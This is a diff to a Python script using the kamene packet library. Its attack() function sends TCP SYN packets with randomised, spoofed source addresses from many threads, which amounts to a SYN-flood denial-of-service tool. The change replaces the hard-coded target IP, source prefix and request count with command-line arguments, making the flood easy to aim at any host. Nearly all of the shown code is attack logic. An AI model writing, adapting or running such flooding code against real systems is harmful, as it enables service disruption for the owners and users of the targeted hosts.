@@ -4,6 +4,10 @@ from kamene.volatile import RandShort
 import random
 import threading
 
+dst_ip = sys.argv[1]
+src_ip_start = sys.argv[2]
+num_requests = sys.argv[3]
+
 thread_num = 0
 thread_num_mutex = threading.Lock()
 
@@ -21,9 +25,9 @@ def print_number():
 def attack():
     print_number()
 
-    src_ip = "192.168.2." + str(random.randint(40, 50))
+    src_ip = src_ip_start + str(random.randint(40, 50))
 
-    iplayer = IP(dst="192.168.2.115", src=src_ip)
+    iplayer = IP(dst=dst_ip, src=src_ip)
     tcplayer = TCP(sport=RandShort(), dport=[
                    8888], seq=RandShort(), ack=1000, window=1000, flags="S")
 
@@ -31,11 +35,8 @@ def attack():
 
     send(packet)
 
-
-num_requests = 5000
-
 all_threads = []
-for i in range(num_requests):
+for i in range(int(num_requests)):
     t1 = threading.Thread(target=attack)
     t1.start()
     all_threads.append(t1)
